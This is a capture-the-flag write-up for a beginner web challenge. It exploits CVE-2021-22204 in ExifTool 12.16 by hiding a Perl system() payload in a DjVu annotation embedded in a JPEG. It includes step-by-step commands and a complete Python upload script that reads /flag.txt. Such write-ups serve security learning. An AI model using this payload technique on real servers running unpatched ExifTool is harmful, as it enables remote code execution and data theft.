# Shell — Web (50 pts)

**CTF:** 0xFun CTF 2026
**Category:** Web
**Difficulty:** Beginner
**Author:** x03e
**Flag:** `0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}`

---

## Description

> This simple web app lets you upload images to inspect their EXIF metadata. But something feels off… maybe your uploads are being examined more closely than you realize. Can you get the server to execute a command of your choosing and expose the hidden flag.txt file?
>
> Note: Only image uploads are allowed. No brute force needed — just the right approach and format.

## Reconnaissance

The web application (Flask/Werkzeug) allows uploading images and displays their EXIF metadata. When uploading a test image, the response reveals key information:

```
Server: Werkzeug/3.1.3 Python/3.9.24
ExifTool Version Number: 12.16
```

**ExifTool 12.16** is vulnerable to **CVE-2021-22204**: arbitrary code execution through malicious DjVu annotations.

## Server source code

```python
from flask import Flask, request, render_template
import subprocess
from werkzeug.utils import secure_filename

def extract_metadata(filepath):
    return subprocess.getoutput(f"exiftool {filepath}")
```

The server passes the file directly to `exiftool`, which when parsing a file with a malicious DjVu annotation executes arbitrary Perl code.

## CVE-2021-22204

ExifTool versions 7.44 to 12.23 process DjVu annotations using `eval` in Perl. An attacker can inject Perl code into an annotation using variable interpolation `${...}` within a double-quoted string:

```perl
"\\c${system('COMMAND')}"
```

When ExifTool evaluates this string with `eval qq{...}`, the expression `${system('COMMAND')}` is executed as Perl code.

## Exploit

### Step 1: Create base image

```bash
python3 -c "from PIL import Image; Image.new('RGB',(100,100),'red').save('test.jpg')"
```

### Step 2: Create malicious DjVu

```python
cmd = "cat /flag.txt"
payload = f'(metadata\n\t(Copyright "\\\\c${{system(\'{cmd}\')}}"))'

with open('payload.txt', 'w') as f:
    f.write(payload)
```

```bash
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=payload.txt
```

### Step 3: Embed DjVu in JPEG

A custom EXIF tag (HasselbladExif, tag 0xc51b) is used to embed the DjVu inside a valid JPEG:

```
# configfile
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'undef',
            WriteGroup => 'IFD0',
        },
    },
);
1;
```

```bash
cp test.jpg malicious.jpg
exiftool -config configfile -overwrite_original '-HasselbladExif<=exploit.djvu' malicious.jpg
```

### Step 4: Upload and get the flag

```bash
curl -s -F "file=@malicious.jpg" http://chall.0xfun.org:20670/
```

The output of `cat /flag.txt` appears mixed with the normal ExifTool output:

```
0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}
ExifTool Version Number         : 12.16
File Name                       : malicious.jpg
...
Warning                         : Ignored invalid metadata entry(s)
```

## Complete script

```python
#!/usr/bin/env python3
import subprocess, requests, os

URL = "http://chall.0xfun.org:20670/"
CMD = "cat /flag.txt"

# 1. Create base image
from PIL import Image
Image.new('RGB', (100, 100), 'red').save('test.jpg')

# 2. Create DjVu payload
payload = f'(metadata\n\t(Copyright "\\\\c${{system(\'{CMD}\')}}"))'
with open('payload.txt', 'w') as f:
    f.write(payload)

# 3. Create DjVu
subprocess.run(["djvumake", "exploit.djvu", "INFO=0,0",
                 "BGjp=/dev/null", "ANTa=payload.txt"])

# 4. ExifTool config
config = """%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'undef',
            WriteGroup => 'IFD0',
        },
    },
);
1;"""
with open('configfile', 'w') as f:
    f.write(config)

# 5. Embed in JPEG
subprocess.run(["cp", "test.jpg", "malicious.jpg"])
subprocess.run(["exiftool", "-config", "configfile", "-overwrite_original",
                 "-HasselbladExif<=exploit.djvu", "malicious.jpg"])

# 6. Upload
with open('malicious.jpg', 'rb') as f:
    r = requests.post(URL, files={'file': ('image.jpg', f, 'image/jpeg')})

import re
flags = re.findall(r'0xfun\{[^}]+\}', r.text)
if flags:
    print(f"FLAG: {flags[0]}")
```

## Notes

- The payload that **did NOT** work: `qx{}` and backticks in the format `"\<newline>" . qx{cmd} . "\<newline>"` — this is the classic format of the original exploit, but in this case the `${system()}` interpolation was what produced results.
- `system()` in Perl sends the command output to stdout, which is captured by `subprocess.getoutput()` on the Flask server.
- `secure_filename()` from Werkzeug sanitizes the filename, blocking injection via filename.
- The flag was located at `/flag.txt` at the root of the Docker container.
